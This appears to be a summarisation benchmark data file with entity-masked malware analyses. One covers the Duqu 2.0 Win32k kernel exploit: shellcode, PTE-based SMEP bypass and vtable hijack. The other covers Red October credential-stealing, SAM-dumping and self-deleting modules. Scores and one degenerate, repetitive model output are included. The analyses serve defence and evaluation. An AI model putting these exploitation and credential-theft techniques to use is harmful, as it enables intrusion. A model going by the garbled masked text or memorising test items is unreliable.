of - concept : Research / POC[1 ] Clear CR4.SMEP via kernel ROP[2 ] Clear CR4.SMEP via custom payload[3 ] Modify U / S flagJun 2015url ( Windows Reserve Objects)url ng - intel - smep - on - windows-8 - x64.htmlX ( KiConfigureDynamic Processor gadget)url amsterdam / praatjes / D1T2 - Bypassing- Endpoint - [ORG] Security - for - Fun - [ORG] and - Profit.pdfXurl [ORG] 14_AFD.sys_privilege_escalation.pdfX ( KiConfigureDynamic Processor gadget)url /08/15 / windows-8 - kernel - memory- protections - bypassurl pdfX ( IDT / GDT)XXXXSMEP bypass PWN2OWN 2014url kd > u 3090000 < - target VA of the shellcode00000000`03090000 4831c000000000`03090003 48ffc8xordecrax , raxrax00000000`03090006 e800000000call 00000000`0309000b00000000`0309000b [CARDINAL] 58pop rax00000000`0309000c [CARDINAL] 4883e805sub rax,500000000`03090010 c600c300000000`03090013 [PERSON] e9b5000000movjmpbyte ptr [ rax],0C3h00000000`030900cd00000000`03090018 4156push r14Shellcode is [ORDINAL] first allocated in the user space using [PRODUCT] VirtualAlloc . Original PTE for shellcode1 : kd > ! pte [CARDINAL] 3090000VA [CARDINAL] 0000000003090000PXE at FFFFF6FB7DBED000 [ORG] PPE at FFFFF6FB7DA00000 PDE at [ORG] FFFFF6FB400000C0 [ORG] PTE at [ORG] FFFFF68000018480contains [ORG] 00C0000033609867 contains 0A5000003368A867 contains [CARDINAL] 19B0000033ADD867 contains 00500000356BE867pfn [CARDINAL] 33609 ---DA -- UWEV pfn [DATE] 3368a [DATE] ---DA -- [ORG] UWEV pfn [CARDINAL] 33add ---DA -- UWEV pfn [PRODUCT] 356be ---DA -- [ORG] UWEV user modeYou can confirm that using ! pte [ORG] Windbg [ORG] command.x64 [ORG] Page table locations\u2022 [ORG] PXE [ORG] Pages FFFFF6FB`7DBED000\u2022 [ORG] PPE [ORG] Pages FFFFF6FB`7DA00000\u2022 [ORG] PDE [ORG] Pages FFFFF6FB`40000000\u2022 PTE Pages FFFFF680`00000000Virtual address to physical address0x3090000 = Binary : 00000000 00000000 00000000 00000000 00000011 00001001 00000000 [CARDINAL] 00000000\u2022 PML4 Offset : [CARDINAL] 000000000\u2022 + PDP Offset : [CARDINAL] 000000000\u2022 + PD Offset : [CARDINAL] 000011000 * [CARDINAL] 8 = 0x18 * [TIME] 8 [TIME] = [TIME] 0xC0\u2022 + Page - Table Offset : 000011000 [CARDINAL] 010010000 * [CARDINAL] 8 = [CARDINAL] 0x3090 * [CARDINAL] 8 = 0x18480\u2022 Physical Page Offset : [CARDINAL] 000000000000 = [CARDINAL] 0x0Byte within pageReading PXENtUserSetClassLongPtr [DATE] rcx=0000000000020150 [DATE] rdx=00000000000145f0 r8 = fffff6fb7dbed000 r9d=1NtUserInternalGetWindowText rcx=0000000000020150 rdx=000000000322d298 r8d=5TextCopy : read fffff6fb`7dbed000 rcx=000000000322d298 rdx = fffff6fb7dbed000 r8=0000000000000008 fffff6fb`7dbed000 [CARDINAL] 67 98 60 33 00 00 c0 00 g. `3 Reading PPENtUserSetClassLongPtr [DATE] rcx=0000000000020150 [DATE] rdx=00000000000145f0 r8 = fffff6fb7da00000 r9d=1NtUserInternalGetWindowText rcx=0000000000020150 rdx=000000000322d2e0 r8d=5TextCopy rcx=000000000322d2e0 rdx = fffff6fb7da00000 r8=0000000000000008 fffff6fb`7da00000 [CARDINAL] 67 a8 68 33 00 00 50 [CARDINAL] 0a g.h3 P.Reading PDENtUserSetClassLongPtr rcx=0000000000020150 rdx=00000000000145f0 r8 = fffff6fb400000c0 r9d=1NtUserInternalGetWindowText rcx=0000000000020150 rdx=000000000322d2e0 r8d=5TextCopy rcx=000000000322d2e0 rdx = fffff6fb400000c0 r8=0000000000000008 fffff6fb`400000c0 [CARDINAL] 67 d8 ad [DATE] 33 [DATE] 00 00 b0 [CARDINAL] 19 g 3 Reading PTENtUserSetClassLongPtr rcx=0000000000020150 [DATE] rdx=00000000000145f0 r8 = [ORG] fffff68000018480 r9d=1NtUserInternalGetWindowText rcx=0000000000020150 rdx=000000000322d2e0 r8d=5TextCopy rcx=000000000322d2e0 rdx = fffff68000018480 r8=0000000000000008 fffff680`00018480 [CARDINAL] 67 e8 6b 35 00 00 50 00 g.k5 P.Writing PTENtUserSetClassLongPtr rcx=0000000000020150 [DATE] rdx=00000000000145f0 r8 = [ORG] fffff68000018480 r9d=1win32k!DefSetText+0xd7 [ [CARDINAL] d:\\9139\\windows\\core\\ntuser\\kernel\\getset.cxx @ [CARDINAL] 95 ] : fffff960`000aeadf e8dcf50200 call win32k!memcpy ( fffff960`000de0c0)rcx = fffff68000018480 rdx=000000000322d328 r8d=8 [CARDINAL] 00000000`0322d328 [CARDINAL] 63 e8 6b 35 00 00 50 00 c.k5 P.PTE corruption [ORG] & [ORG] SMEP bypass1 : kd > ! pte [CARDINAL] 3090000PXE at FFFFF6FB7DBED000 [ORG] PPE at FFFFF6FB7DA00000 PDE at FFFFF6FB400000C0 PTE at [GPE] FFFFF68000018480 contains [PERSON] 00C0000033609867 contains 0A5000003368A867 contains [CARDINAL] 19B0000033ADD867 contains [PERSON] 00500000356BE867VA 0000000003090000pfn [CARDINAL] 33609 ---DA -- UWEV pfn [DATE] 3368a [DATE] ---DA -- [ORG] UWEV pfn [CARDINAL] 33add --- DA -- UWEV pfn [PRODUCT] 356be ---DA -- UWEV User ModeAfter corruption , the mode for [ORG] PTE is changed.contains 00C0000033609867 contains 0A5000003368A867 contains [CARDINAL] 19B0000033ADD867 contains 00500000356BE863pfn [CARDINAL] 33609 ---DA -- UWEV pfn [DATE] 3368a [DATE] ---DA -- [ORG] UWEV pfn [CARDINAL] 33add --- DA -- UWEV pfn [PRODUCT] 356be ---DA \u2014 KWEV Kernel ModeShellcode executionExploitation processUse - after - freeAcquire initial memory [ORG] RWaccessAcquire full memory RWaccessSMEP bypassShellcode executionOriginal PALETTE vtable1 : kd > dt win32k!PALETTE fffff901`407517b0 - 0x60 + 0x000 hHmgr : 0xffffffff`f2080898 Void +0x060 pfnGetNearestFromPalentry : 0xfffff960`000958d4 unsignedlong win32k!ulIndexedGetNearestFromPalentry+0 < - original function pointer+0x068 pfnGetMatchFromPalentry : [CARDINAL] 0xfffff960`00095914 unsigned longwin32k!ulIndexedGetMatchFromPalentry+0PALETTE object is created in kernel space . Corrupt PALETTE vtable1 : kd > dt win32k!PALETTE fffff901`407517b0 - 0x60 + 0x000 hHmgr : 0xffffffff`f2080898 Void +0x060 pfnGetNearestFromPalentry : [CARDINAL] 0x00000000`03090000 unsignedlong +3090000 < - corrupt function pointer+0x068 pfnGetMatchFromPalentry : [CARDINAL] 0xfffff960`00095914 unsigned longwin32k!ulIndexedGetMatchFromPalentry+0The pointer to GetNearestFromPalentry is corrupted to shellcode location . [PERSON] Shellcode [PERSON] execution@ [PERSON] CTwoPENC+2731 ( inside CallGetNearestPaletteIndex ) * GetNearestPaletteIndex(HPALETTE hpal : f2080898 , COLORREF crColor : ffff)Finally call GetNearestPaletteIndex method to initiate shellcode in ring-0 space . Rekall tagCLS corruption detection\u2022 Find every tagWND Object.\u2022 Dump tagCLS object from tagWND+0x98.\u2022 [GPE] Check if tagCLS.cbClsExtra field is huge , usually it is0xffffffff when it is used by exploit . Rekall tagCLS corruption detectionu = s.plugins.userhandles()for ( session , shared_info , handle ) in u.handles():if handle.bType=='TYPE_WINDOW':handle_head = int('%x'%handle.phead,16)bytes = handle.phead.obj_vm.read(handle_head+0x98 , 8)[tag_cls_addr]=struct.unpack(\"Q\",bytes)bytes = handle.obj_vm.read(tag_cls_addr+0x60 , 4)[cb_cls_extra]=struct.unpack(\"L\",bytes)if [GPE] cb_cls_extra==0xffffffff : detected'print ' * Detection : [CARDINAL] tagCLS.cbClsExtra exploitationConclusion\u2022 Duqu [CARDINAL] 2.0 Win32k exploit is an advanced piece ofmalware.\u2022It involves many different techniques to achieve exploitation with good success rate.\u2022 The techniques used are not usually observed withother Win32k exploits .", "generated_text": "Duqu 2.0; Microsoft; Duqu malware; the vulnerability; Windows; APIs; memory; the exploit; the WMI; RAT; the malware; the components; Entity; Hacking; Detection; PowerShell; commands; C2; code execution; the infrastructure; the exploit; the victim; a new object; the victim; the C2; privileges; the new object; an address; a structure; the payload; the operation; the code; Loader; the attacker; the C2 domain; the C2 domain; the main domain; the attack; the configuration; the C2 domain; the C2 domain; a C2 domain; the C2 domain; the attacker; a C2 domain; the domain; the C2 domain; the C2 domain; the C2 domain; credentials; the C2 domain; the C2 domain; the C2 domain; the C2 domain; the C2 domain; the C2 domain; the C2 domain; the C2 domain; a C2 domain; the C2 domain; the C2 domain; the C2 domain; A domain; a C2 domain; the C2 domain;", "ref_text": "<START-1>Here is a summary of the Duqu 2.0 Windows kernel exploit PDF: The Duqu 2.0 malware utilized an advanced exploit targeting a vulnerability in the Windows kernel (Win32k component) to achieve privilege escalation and arbitrary code execution. Discovered by Kaspersky Lab, the exploit shares similarities with the original Duqu malware. The vulnerability arises due to a use-after-free condition triggered when a userland process registers a ClientCopyImage callback which destroys the Window object, while also unregistering the associated class. This leads to a dangling pointer being used by the HMUnlockObject function, allowing corruption of the tagCLS object's cbclsExtra field. By allocating a fake object after the freed memory, the exploit can control the memory layout and contents. Through corrupting the cbclsExtra field to 0xFFFFFFFF, the exploit gains read/write access to kernel memory by using APIs like SetClassLong/GetClassLong with out of bounds indices. It locates the tagWND object and overwrites its strName field to get arbitrary memory read/write. The exploit bypasses SMEP protection by modifying the PTE entry for its shellcode to change the access mode from user to kernel. Shellcode execution is achieved by overwriting the function pointer in the PALETTE object's vtable to point to the shellcode. Calling the GetNearestPaletteIndex method triggers the shellcode. The exploit showcases techniques not commonly observed in prior Win32k exploits. Detection is possible by inspecting tagCLS objects for corruption of the cbclsExtra field. Overall, Duqu 2.0 utilized an intricate Windows kernel exploit as part of its malware toolset. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.3620689655172414, "gpt3/lexical/rouge_rouge2": 0.10404624277456645, "gpt3/lexical/rouge_rougeL": 0.20689655172413793, "gpt3/lexical/rouge_rougeLsum": 0.20689655172413793, "gpt3_generated_text": ["The article discusses the discovery of Duqu 2.0, a malware that is similar to the original Duqu malware. The vulnerability used for the attack has already been patched by Microsoft. The exploit involves a use-after-free condition and allows the attacker to gain elevated privileges and execute shellcode. The article explains the nature of the vulnerability and how the exploit works. It also discusses the components used in the attack, such as the Windows APIs and memory manipulation. The article emphasizes the need to educate the industry and share knowledge about these exploits."]}, {"split_name": "test", "sample_id": "test_18", "prompt_text": "Extract the keywords: \u201c Red [DATE] October \u201d . Detailed Malware Description [CARDINAL] 3 . Second Stage of Attacksecurelist.com/red-october-detailed-malware-description-3-second-stage-of-attack/36802/By GReATFirst stage of attack1 . Exploits [CARDINAL] 2 . Dropper [CARDINAL] 3 . Loader Module 4 . [ORG] Main componentSecond stage of attack [CARDINAL] 1 . [PERSON] Modules , general overview [CARDINAL] 2 . [ORG] Recon group [CARDINAL] 3 . [ORG] Password group [CARDINAL] 4 . Email group [CARDINAL] 5 . USB drive group [CARDINAL] 6 . [ORG] Keyboard group [CARDINAL] 7 . Persistence group [CARDINAL] 8 . Spreading group [CARDINAL] 9 . [GPE] Mobile group [PERSON] Studio [PERSON] 2005 . It is written in C / C++.Entrypoint , unpacking stub , and obfuscationRelated binaries are heavily packed with a custom packer . The packer disrupts basic software breakpoints and some api hooking techniques , because it decrypts the original exe \u2019s section contents onto heaps in - memory and then writes the decrypted code and .data , .rdata contents back over the original sections , hopping back into the decrypted code and executing from there . SummaryAt its [ORG] OEP , the module further retrieves environment information , and then creates a mutex with the string \u201c SUPER MUTEX \u201d . Then the module steals authentication credentials from mail.ru agent software and attempts to steal open and saved attachments on the system from the Outlook Secure Temp Folder . The executable then fails to write its own contents to another executable file in tmp and maintain persistence on the system . Network functionality is absent from this module . Credential StealingThe module steals [GPE] Mail . [PRODUCT] Ru [PRODUCT] Mail [PRODUCT] Agent account credentials by reading relevant registry in order to extract the passwords or decrypt them depending of the version . The [CARDINAL] two locations this data is accessed areRegistry key / value pair for [GPE] Mail . Ru Agent version < [CARDINAL] 5.2 Registry key : [PERSON] HKCUSoftwareMail . RuAgentmagent_logins , binary value : [MONEY] # [MONEY] # [MONEY] # [MONEY] # password Registry key / value pair for [GPE] Mail . Ru Agent version [CARDINAL] 5.2 to [CARDINAL] 5.6 Registry key : HKCUSoftwareMail . RuAgentmagent_logins2 binary value : [MONEY] # [MONEY] # [MONEY] # [MONEY] # password Registry key / value pair for [GPE] Mail . Ru Agent version > = [CARDINAL] 5.7 ( Last version [CARDINAL] 6 is also supported ) Registry key : HKCUSoftwareMail . RuAgentmagent_logins3 binary value : [MONEY] # [MONEY] # [MONEY] # [MONEY] # password Text file used by [GPE] Mail . Ru Agent to store [NORP] Blowfish encryption key % APPDATA%MraUpdatever.txtThe contents of this registry keys are read and the blowfish key stored inside \u201c ver.txt \u201d is used to decrypt the passwords , in version [CARDINAL] 5.7 and above . All actions are logged with time stamp , and then encrypted and written to % temp%~avp2.log . The module will attempt to access \u201c ver.txt \u201d which is protected on the system . If it can read it using standard API functions , it uses NTFS low level access . In order to do so , it uses the [ORG] DeviceIoControl API function with the \u201c FSCTL_GET_NTFS_VOLUME_DATA \u201d and \u201c [PERSON] FSCTL_GET_NTFS_FILE_RECORD \u201d IOCTLs . The data of this file will also be written to % temp%~mslog.tmp , which is a backup of \u201c ver.txt\u201dAfter the module will build a new string with the current timestamp followed by delimiting dashes and indication that the module has finished running , like \u201c [CARDINAL] 2012:11:10:10:22:34\u2014\u2014-PROGA END \u201c . This string will be written to the2/21 ~ avp2.log file . Here is an example of a decrypted ~avp2.log file : \u201c [CARDINAL] 2012:11:22:17:21:44\u201d\u2014\u2014-PROGA START \u2014 \u2013 \u201c 2012:11:22:17:21:44\u2033ERROR ACCESS file ver.txt \u201c [WORK_OF_ART] 2012:11:22:17:21:44\u2033FILE [WORK_OF_ART] SYSTEM NTFS \u201c 2012:11:22:17:21:44\u2033PROBING GET FILE LOW LIVEL \u201c 2012:11:22:17:21:44\u2033ACCESS LOW LIVEL OK ! ! ! ! \u201c [CARDINAL] 2012:11:22:17:21:44\u2033REG OPEN KEY[SoftwareMail . RuAgentmagent_logins3 ] \u201c 2012:11:22:17:21:44\u2033SUB KEY[000#victim@mail.ru ] \u201c 2012:11:22:17:21:44\u2033uin(0 ) [ 000#victim@mail.ru ] passwd(0)[%removed% ] \u201c [CARDINAL] 2012:11:22:17:21:44\u201d\u2014\u2014-PROGA END \u2014 \u2013 The string between \u201c [ \u201d and \u201c ] \u201d is binary value of [WORK_OF_ART] MD5 [WORK_OF_ART] Hash of the Mail.ru Agent password . All restored credentials are also stored encrypted in the \u201c ~pass2.pwl \u201d file without the time stamp information and how they were accessed . Meanwhile \u201c PROGA \u201d word used in here might refer to transliteration of [NORP] Russian slang \u201c [PERSON] \u041f\u0420\u041e\u201dwhich literally means an application or a program . Attachment stealing The module will finally attempt to steal open attachments or attachments that were open when the machine or Outlook application shutdown unexpectedly . It identifies and collects these files from a directory path that looks like \u201c C:\\Documents and Settings\\%username%\\Local Settings\\Temporary Internet Files\\OLK%xxx%\u201c . Failed persistence The module then attempts to maintain some persistence on the system by repeating the routine . It creates % temp%\\19d400.msv , and attempts to write a copy of its own executable contents to it . Oddly , the [ORG] WriteFile size parameter is set to \u201c 0 \u201d and the write fails . It then attempts to run this 19d400.msv file by calling CreateProcessA on it , which also fails . The module thread terminates the process . Finally , it is interesting that network functionality is absent from this module . Interesting decrypted runtime strings : [CARDINAL] 19d400.msv Software\\Mail . Ru\\Agent\\magent_logins2 Software\\Mail . Ru\\Agent\\magent_logins www.mail.ru ProcessRead ok ! OPEN PROCESS agent_mail.ru OK ! % s\u2014\u2014-PROGA END \u2014 \u2013 % sPROBING GET FILE LOW [PERCENT] LIVEL [PERCENT] % sACCESS LOW LIVEL OK ! ! ! ! % sERROR OPENFILE3/21%sERROR GET ACCESS LOW LIVELPswOutlook module The file is a [ORG] PE [ORG] EXE file , compiled with [ORG] Microsoft [ORG] Visual [ORG] Studio [ORG] 2008 . All the functionality is implemented in the WinMain function . There are [CARDINAL] 2 known variants of this module in [QUANTITY] over [QUANTITY] 50 [QUANTITY] files with identical behavior . Like PswSuperMailru , this highly - obfuscated module is very different from others . Its main purpose is to steal email credential information of the current user . This is achieved by reading system protected storage and system registry . The result is stored in an encrypted file , after that the application self - removes . Main function This module starts from decrypting pieces of information carefully puzzled in the file body . The puzzle contains extra library names , export function names , their parameters and set of internal references . The encryption algorithm reminds PKZIP encryption but seems to be modified . Decrypted data is carefully collected and filled in a set of internal objects . Next , module connects to the local registry using RegConnectRegistry system API call . This is not clear why the developers decided to use RegConnectRegistry call . They either tried to bypass some local IDS / [ORG] IPS systems by avoiding usage of RegOpenKey / RegOpenKeyEx calls or the application was designed to connect to remote computers as well . In all samples we have observed , lpMachineName parameter is set to [ORG] NULL meaning to connect to local registry . It dumps MS Outlook account information from the following registry keys : HKCU\\Software\\Microsoft\\Internet Account Manager HKCU\\Software\\Microsoft\\Office\\Outlook\\OMI Account Manager\\Accounts HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging HKCU\\Subsystem\\Profiles\\Microsoft\\Outlook Internet Settings HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging [DATE] Subsystem\\Profiles\\OutlookAfter that it attempts to access and dump local protected storage identities information via PStorec.dllAPI.Collected information is stored in encrypted file : % Temp%\\{B30BD41D-46E7 - 458B- F412 - 4D7F80CCAD0F } . The file contains a [CARDINAL] 32bit hash of data in the end.4/21This module never communicates with the [ORG] C&C server and works as a standalone tool . In the end of execution before exiting application it runs self - removal procedure as described below . Self - removal procedure When the module needs to end the execution and self - remove , it spawns a % COMSPEC% process ( cmd.exe or command.com on older systems ) [PERSON] HKCU\\Software\\Microsoft\\Internet [PERSON] Account Managerusing the following commandline : cmd.exe /c del /F /A \u201c % MODULE_PATH% \u201d > > NULLThis procedure is very unreliable as it is prone to race - condition issues which might result in modules remaining undeleted . [ORG] MSHash module This module is a standalone executable , which is essentially a tool to dump cached domain password hashes , and locally stored sensitive information , such as [ORG] LSA secrets . It uses direct disk access to bypass system registry ACLs . After execution the module self - removes . [ORDINAL] First , it uses direct disk access to copy registry files from % SYSTEM%\\config\\ directory:%SYSTEM%\\config\\sam - > % [PERCENT] Temp%\\ksm [PERCENT] % SYSTEM%\\config\\system - > % Temp\\kss % SYSTEM%\\config\\SECURITY - > % Temp%\\kseThen module fetches available cached domain account hashes as well as local system [ORG] LSA secrets . The later may contain logins and passwords from various services in plaintext . Also , it fetches [ORG] Syskey bootkey secret and appends it to the output . The result is stored in an encrypted file of custom binary format which is located [ORG] in%TMP%\\smrdprev.tmp . The contents of the file contains internal file reference string , including date and time when it was created , i.e. \u201c @MSHASH\\SAMHASH_2_20121002_034519.txt \u201c . This is probably suggested relative path and file name during data extraction procedure on the attackers system.5/21The module also creates an encrypted log file with detailed information of program execution . It is stored in similar file \u201c % TMP%\\smrdprev.tmp \u201c , the hex number depends on current system boot time . It is encrypted in the same way as the main output file , using custom cryptoalgorithm based on AMPRNG cryptomethod . Current module also tags current system by changing the following registry keys : HKCU\\Software\\Microsoft\\ADOSoftware32\\ProductID = binary value of [CARDINAL] 20 bytes ( System ID ) HKLM\\Software\\Microsoft\\ADOSoftware32\\ProductID = binary value of [CARDINAL] 20 bytes ( System ID)System ID is calculated as SHA1 - hash of [FAC] System [FAC] Drive [FAC] Volume [FAC] Serial Number and HKLM\\SOFTWARE\\Microsoft\\Internet Explorer\\Registration\\ProductID value . These keys remain after malware self - removes an may serve as good way to identify if your system was hit by this module in the past . Most of the cryptoroutines such as DES , RC4 , HMAC_MD5 , MD4 are used from statically linked OpenSSL 0.9.8 g library . After the end of execution it deletes temporary files and self - removes with simple msc.bat file of the following contents : chcp [DATE] 1251 : Repeat attrib -a -s -h -r \u201c \u201d del \u201c \u201d if exist \u201c \u201d goto Repeat del \u201c msc.bat\u201dNote , that current batch file sets current codepage to CP1251 , which is used to display [PERSON] Cyrillic characters in console output . [CARDINAL] 4 . Email group MAPIClient module The file is a [ORG] PE [ORG] EXE file , compiled with [ORG] Microsoft [ORG] Visual [ORG] Studio [DATE] 2010 . All the functionality is implemented in the [PRODUCT] WinMain function . This module is used to steal email information of the current user by getting most valuable information about messages , starting from general fields ( To / From / Date / Subj ) , copying full MIME headers and message body , and stealing attachments if extension looks interesting ( documents , archives , cryptokeys ) . The result is stored in a set of encrypted and compressed files , after that the application self - removes . Main function It starts from creating a new encrypted log file in current directory of the executable , named \u201c system32ocxms.dat \u201d . The [ORDINAL] first log entries contain the following : Program started V : MSG_26.10.12 This probably indicate internal module name ( [ORG] MSG ) and version ( set after date of creation [CARDINAL] 26.10.12 ) . Current application has n\u2019t got an embedded config / script file in resource section , all parameters are hardcoded . Next it fetches the current system general information and default application preferences from the registry , including the following : [PERSON] User name [PERSON] Computer name [PERSON] User domain name ( from [GPE] % USERDOMAIN% and [PERSON] % USERDNSDOMAIN% ) Default system HTTP protocol handler from HKCR\\HTTP\\shell\\open\\command Default system HTTPS protocol handler from HKCR\\https\\shell\\open\\command Default system application for html files from HKCR\\htmlfile\\shell\\open\\command Default system e - mail client from HKCR\\mailto\\shell\\open\\commandThis information is added to the log file . Next it checks if MS Outlook is installed , if it is actively running , whether it is system default e - mail client . This is appended to the log either . During next step , it creates a watchdog thread , which every checks foreground window every [QUANTITY] 10 [QUANTITY] milliseconds and in case current foreground window belongs to current process it spawns self - removal batch - file ( see description in section below ) and terminates current process . This is done in case [ORG] Microsoft Windows MAPI framework creates a popup message with some connection error report , or asks the user to enter credentials from the mailbox . The developers obviously wanted to7/21escape unnecessary attention and that is why they thought that it would be better to shutdown and self - remove the module without collecting any information instead of getting caught by attracting attention . After watchdog thread was created the module lists local user mail addresses by connecting to system MAPI . It gets [PERSON] User [PERSON] Email , Address Type and [PERSON] User [PERSON] Name . Next it iterates through existing MAPI storages for current user and dumps full information about all messages to the main log file , including e - mail header values , such asSubject AttachmentSizeThe emails of attackers \u2019 interest with attachments are saved in a separate encrypted and [ORG] Zlib - compressed storage file ( new storage file is created for each directory):%CurrentDir%\\sys_%HexNumber%\\winocx_%IntegerCounter%_rdtp.tmpThe attachment storage file is limited to 60Mb , RC4 encryption key is1 specialforoutlookattachments!The filter for interesting emails is defined in a list of regular expressions ( [ORG] PCRE lib is used to process those):.doc .xls .txt .vcf .p7 m .mdb .msgz .dcx .egk .zm9 .docx .xlsx .eml .CCC .cif .fas .msg .kum .key .out .rtf .pdf .enc .TOK .wps .sbox .lock .ass .cer .pem .odt .rar .html .xia .sec .cm5 .xps .pgp .wfh .cbu .ods .zip .htm .xis .dat .rhs .x05 .xiti .grp .sig .dot .gpg mht .p7s .dth .max .y05 .egm .pot .ftilCurrent module is also capable of dumping full contents of local system [PERSON] Address [PERSON] Book , however this functionality is currently disabled by the developer ( probably because of some bugs in the code).This module never communicates with the [ORG] C&C server and works as a standalone tool . In the end of execution before exiting application it runs self - removal procedure as described below . Self - removal procedure When the module needs to end the execution and self - remove , it creates a batch - file with pseudo - random name : % HOMEDRIVE%%HOMEPATH%\\Local Settings\\Temp\\.bat . If it could n\u2019t create random name , the name will be set to \u201c syspart.bat\u201d . The file contains:8/21 : Repeat del /F /A \u201c \u201d if exist \u201c \u201d goto Repeat del /F /A \u201c \u201d POP3Client module ( GMT)2011.05.25 11:49:19 ( GMT)Summary The file is a [ORG] PE [ORG] EXE file , compiled with [ORG] Microsoft [ORG] Visual [ORG] Studio 2005.This module is responsible for receiving and storing email messages on a local computer from a POP3 server specified in a configuration file . All the actions and important info are written to a log file . Main function [PERSON] Creates mutex \u201c [CARDINAL] 208D2C60 - 3AEA-1069 - A2D7 - 08002B30309D\u201dCreates a directory and a log file in it : % ALLUSERSPROFILE%\\Application Data\\System\\smrdprev.%d%d.tmp ( % d values correspond to [PERSON] time64 ( ) ^ 0x1F3E231 and GetTickCount()).Installs in system AutoRun:>HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run \u201c [WORK_OF_ART] LgfxTray\u201d= [WORK_OF_ART] PathToExeOther [WORK_OF_ART] Registry entries : HKLM\\SOFTWARE\\Microsoft\\ADOSoftware32 HKCU\\SOFTWARE\\Microsoft\\ADOSoftware32 \u201c ProductID \u201d = SHA1(MAC , AdapterIP , VolumeSerialNumber , IE Product ID)Always starts the log file from:@LOG\\CMAIL_LOCAL_v1 _ % [ORG] YEAR%%MONTH%%DAY%_%HOUR%%MIN%% [ORG] SEC%.txt [ORG] Software version : [ORG] 0.8 [ORG] Current Directory : [ORG] % s \u201c \u2014 \u2014 \u2013 PROGA START\u2014\u2014-\u201dOpens mutex \u201c huiofwhfiowjcpowjkcwcophwvurweionwopmcvopwkvpwjnhopv \u201d , if it exists , then module terminates.9/21Tries to open config file \u201c jusched32s.dat \u201d and read the contents . If the file does n\u2019t exist , then terminates . Checks file MD5 hash in file header ( [ORDINAL] first 16 bytes ) , if it was changed after the last saved MD5 ( in memory as a variable ) , then updates it and writes the new hash to log file . If calculated hash of the file buffer matched the header hash then module decrypts and parses config file and launches POP3 client thread , otherwise terminates . Parameters in config file : common emailIf \u201c unistall \u201d parameter is set in config file , then module deletes [ORG] AutoRun keys in registry , config [ORG] filejusched32s.dat and terminates . POP3 client thread By default all connections are not encrypted with SSL . There is a variable which for some reason is not initialized , that is used to control the network communication , i.e. to use SSL encryption or not . Establishes a connection based on \u2018 pop3server \u2019 ( or \u2018 imapserver \u2019 ) , \u2018 login \u2019 and \u2018 password \u2019 parameter values in config file . After receiving the number of emails as a response on [ORG] STAT command starts processing emails in cycle . Forms an MD5 hash from a string in format \u201c % s%s%s \u201d with \u2018 login \u2019 parameter , \u2018 pop3server \u2019 parameter and the value that depends on current processed email number and [ORG] UIDL response . Seeks in directory specified in \u2019 email_hash_path \u2019 for * mso.dat files , reads their contents and compares the hashes stored in them with calculated hash.10/21If calculated hash is found in the contents , then the module does n\u2019t process the current email , otherwise gets email message size from a POP3 server with a [FAC] LIST command . [PERSON] Creates [PERSON] File [PERSON] % email_hash_path%\\%s%.mso.dat ( % s \u2013 [ORG] CRC32(GetUserName ) ) and appends counted hash to it . If the new [PRODUCT] File [PRODUCT] Size is bigger than \u2018 storage_hash_size \u2019 than rewrites the file with the latest data so it \u2019s size does n\u2019t exceed \u2018 storage_hash_size\u2019 . If email size is in the range \u2018 size_min\u2019-\u2018size_max \u2019 then the module retrieves email headers and email message body , otherwise stops email processing . Then the module parses the response , retrieves the date of email , counts [DATE] days elapsed and compares it to \u2018 time_delta \u2019 . If it \u2019s bigger than \u2018 time_delta \u2019 then breaks the email processing cycle . Creates file : % storage_path%\\bcmntc.%d.tmp ( % d \u2013 time64 ^ 0x1F3E231.tmp ) with decrypted contents including email header : @CMAIL_LOCAL\\%s_%04u%02u%02u_%02u%02u%02u\\%d.eml ( \u2019 email \u2019 field , Date , Email number ) and email contents itself . Some buffers are compressed with zlib . All the collected data is stored locally and is n\u2019t uploaded to any [ORG] C&C by this module . [CARDINAL] 5 . [ORG] USB [ORG] Drive group [ORG] USBContainer module This is a standalone EXE application module which is used to drop and run [ORG] USBStealer module ( IGFXTRAYMS.exe ) along with its configuration file ( imapisync32.dat)Those [CARDINAL] two files are zlib compressed and stored in the overlay of the dropper . Main function Upon execution , the dropper reads its overlay and decompresses it in memory . The configuration file \u201c imapisync32.dat \u201d is dropped [ORDINAL] first followed by the opening of a system event named \u201c [PRODUCT] ScxinWordSid_0129211FA \u201d . This event is created by the USBStealer module.11/21Afterwards , it will try to delete the \u201c [PERSON] IGFXTRAYMS.EXE \u201d file without checking if it exists or not . The [ORG] USBStealer module is then dropped using the following file name : \u201c [PERSON] IGFXTRAYMS.EXE \u201d and executed . Both files are dropped in the same directory of the dropper . Finally , the following will be executed [CARDINAL] 3 times before exiting : C:\\WINDOWS\\system32\\cmd.exe /c del C:\\DOCUME~1\\%PATH_TO_DROPPER.EXE% > > NULThis module does n\u2019t create any execution log files , nor does it connect to the [ORG] C&C This module is a standalone [PRODUCT] Windows executable which is automatically started on system boot and runs secretly in the background . It expects removable media arrival and recovers deleted files of attackers \u2019 interest from it . This lets the attacker copy deleted docs as well as ZIP and [ORG] RAR archives from attached removable media . Initialization Upon start the module creates a general purpose log file in % TMP%\\smrdprev tmp , where [ORG] DWORD is a current time value xored with [CARDINAL] 0x1F3E231 , [PRODUCT] DWORD2 is value of GetTickCount ( ) API call . So , basically log file path is % TMP%\\smrdprev tmp . Same xor value is used among all variants we have seen ( [QUANTITY] 20 + files).General log starts with internal module name which is essentially \u201c USB_RESTOREv1 \u201d . It also logs software version which is \u201c [CARDINAL] 0.5 \u201d for current module . Other modules had different hardcoded versions . The variants we have seen had [CARDINAL] 0.3 , [CARDINAL] 0.5 and [CARDINAL] 0.6 . However , there are few files which did n\u2019t have any indication of internal module version and are probably the earliest versions . The log file also includes detailed information about the system it was launched on . Example of system info : TIME : \u201c 2012 - 11 - 12 18:07:26 [CARDINAL] 514 \u201d TimeZone : \u201c [WORK_OF_ART] Russian [WORK_OF_ART] Standard [WORK_OF_ART] Time \u201d LOCALE : \u201c Russian_Russia.1251 \u201d OwnFile : \u201c C:\\wusb.exe\u201dThe module changes registry to run automatically during system start : HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\ctfmon32rt = [CARDINAL] 13/21If it did n\u2019t succeed with HKLM ( HKLM ) it will try to set similar value in [ORG] HKCU ( HKCU).Next step , it checks if current user has local administrator rights and logs this as well ( \u201c \u2014 